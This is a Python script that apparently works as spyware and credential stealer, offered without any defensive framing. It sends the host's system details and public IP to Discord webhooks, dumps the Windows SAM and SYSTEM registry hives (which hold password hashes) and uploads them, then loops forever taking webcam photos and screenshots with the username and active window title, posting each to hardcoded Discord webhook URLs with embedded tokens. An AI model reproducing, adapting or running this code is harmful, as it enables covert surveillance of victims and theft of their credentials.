from discord_webhook import DiscordWebhook, DiscordEmbed
import socket
import platform
from requests import get
from time import sleep
import cv2
import pyautogui
import getpass
import pygetwindow as gw
import shutil
import subprocess
import requests
import os

key = cv2.waitKey(1)
webcam = cv2.VideoCapture(0)
sleep(2)

def create_webhook(url, username='Batman'):
    return DiscordWebhook(url=url, username=username)

def computer_information(webhook):
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    
    try:
        public_ip = get("https://api.ipify.org").text
        embed = DiscordEmbed(title="Public IP Address: " + public_ip, color=123123)
        webhook.add_embed(embed)
    except Exception:
        embed = DiscordEmbed(title="Couldn't get Public IP Address")
        webhook.add_embed(embed)

    embed = DiscordEmbed(description="Processor: " + platform.processor() + '\n')
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="System: " + platform.system() + " " + platform.version() + '\n')
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="Machine: " + platform.machine() + "\n")
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="Hostname: " + hostname + "\n")
    webhook.add_embed(embed)
    embed = DiscordEmbed(description="Private IP Address: " + IPAddr + "\n")
    webhook.add_embed(embed)
    
    webhook.execute()

def capture_image(webhook_url):
    check, frame = webcam.read()
    

    if not check:
        print("Erreur lors de la capture de l'image depuis la webcam.")
        return

    cv2.imwrite('capture_temp.jpg', frame)
    webhook = DiscordWebhook(url=webhook_url)
    embed = DiscordEmbed(title='Captured Image', description='Image from webcam', color=0x3498db)
    
    with open('capture_temp.jpg', 'rb') as f:
        embed.set_image(url='attachment://capture_temp.jpg')
        webhook.add_file(file=f.read(), filename='capture_temp.jpg')
    
    webhook.add_embed(embed)
    webhook.execute()
    key = cv2.waitKey(1)

def screenshot(webhook_url):
    username = getpass.getuser()
    active_window_title = get_active_window_title()
    
    image = pyautogui.screenshot()
    image_path = 'screenshot.png'
    image.save(image_path)
    
    webhook_screenshot = create_webhook(webhook_url)
    embed = DiscordEmbed(title="Batman Infos", color=0x3498db)
    embed.set_footer(text="Captured by Batman Bot")
    embed.set_image(url='attachment://screenshot.png')
    embed.add_embed_field(name='Username', value=username)
    embed.add_embed_field(name='Active Window', value=active_window_title)
    
    webhook_screenshot.add_file(file=open(image_path, 'rb'), filename='screenshot.png')
    webhook_screenshot.add_embed(embed)
    webhook_screenshot.execute()

def get_active_window_title():
    try:
        active_window = gw.getWindowsWithTitle(gw.getActiveWindow().title)
        if active_window:
            return active_window[0].title
    except Exception as e:
        print(f"Error getting active window title: {e}")
    return None

def Windows(webhook_url):
    # Sauvegarde des hives du Registre Windows
    subprocess.run(['reg', 'save', 'HKLM\SAM', r'C:\sam'], shell=True)
    subprocess.run(['reg', 'save', 'HKLM\SYSTEM', r'C:\system'], shell=True)


    # Liste de fichiers à envoyer
    files = [('file1', ('sam', open('C:/sam', 'rb'))), ('file2', ('system', open('C:/system', 'rb')))]


    data = {'content': 'Here are the files you requested.'}

    # Envoi des fichiers au webhook Discord
    try:
        response = requests.post(webhook_url, data=data, files=files)
        response.raise_for_status()
        print("Files successfully sent to Discord.")
    except requests.exceptions.RequestException as err:
        print(f"Error sending files to Discord: {err}")
    finally:
        # Fermeture des fichiers
        for _, file_data in files:
            file_data[1].close()

def main():
    webhook_info = 'https://discord.com/api/webhooks/1179897294024360089/UIdyF0OYWNEbnMM4slmmJFyi67j8ritXSdqExYjT2tRyYUWn1MAh3-MK0Msr3UEZ5s7Q'
    webhook_capture = 'https://discord.com/api/webhooks/1181579952865419314/7uGEy040yuo8jukOzt5CJXlNo6k8a9VrmgeNaLGPp9RaiqHgQcsr0y7ouSDwmWFIH8Ez'
    webhook_screenshot = 'https://discord.com/api/webhooks/1181250956294365235/dTgbhtiAO2RID6vmWpuf88I3XnIkD17FgY19gRMKWXo71cOU-gQcEJgRVGbCCLvGA_fy'
    webhook_windows = 'https://discord.com/api/webhooks/1186985816254316574/pEkFuwOfHZ_cKTFglI8QXZLedEfwaF9FleoiagqpKVTvqxyg7myl3lQu2apzO7sdHp8h'

    webhook_info_obj = create_webhook(webhook_info)
    computer_information(webhook_info_obj)
    Windows(webhook_windows)
    while True:
        capture_image(webhook_capture)
        screenshot(webhook_screenshot)

if __name__ == "__main__":
    main()
